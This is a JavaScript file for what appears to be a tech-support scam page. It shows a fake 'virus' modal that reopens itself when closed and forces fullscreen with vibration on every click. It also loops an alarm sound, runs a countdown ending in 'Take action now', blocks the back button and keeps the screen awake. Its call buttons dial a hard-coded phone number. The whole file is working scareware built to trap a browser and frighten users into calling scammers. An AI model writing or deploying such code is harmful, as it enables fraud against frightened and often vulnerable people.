$(document).ready(() => {
  // Function to start the countdown timer
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // When the countdown reaches 0, stop the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        alert("Time is up! Take action now.");
      }
    }, 1000);
  }

  // Start the countdown timer
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = document.getElementById("audioPlayer");

  // Function to play audio in a loop
  function playAudioLoop() {
    audioPlayer.play();
    audioPlayer.addEventListener("ended", () => {
      audioPlayer.play();
    });
  }

  // Function to enable fullscreen and vibrate
  function goFullScreenAndVibrate() {
    const element = document.documentElement; // Use the whole document for fullscreen

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
      element.mozRequestFullScreen(); // Firefox
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen(); // Safari
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen(); // IE/Edge
    }

    // Trigger a vibration pattern
    if (navigator.vibrate) {
      navigator.vibrate([200, 100, 200]); // Custom vibration pattern
    }
  }

  // Ensure fullscreen is triggered when the modal is shown
  if (virusModal) {
    virusModal.addEventListener("show.bs.modal", () => {
      goFullScreenAndVibrate();
      playAudioLoop();
    });

    // Reopen the modal and fullscreen when it is hidden
    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3-second delay
    });
  }

  // Trigger fullscreen on user interaction
  window.addEventListener("touchstart", goFullScreenAndVibrate);
  window.addEventListener("click", goFullScreenAndVibrate);

  // Handle button actions
  $("#vibrateButton").on("click", () => {
    goFullScreenAndVibrate();
  });

  $("#callButton, #callButton1, #callButton2").on("click", () => {
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent back navigation
  history.pushState(null, null, window.location.href);
  window.onpopstate = () => history.forward();

  // Prevent screen sleep using the Screen Wake Lock API
  if ("wakeLock" in navigator) {
    navigator.wakeLock
      .request("screen")
      .catch((err) => console.error("Wake lock error:", err));
  }
});
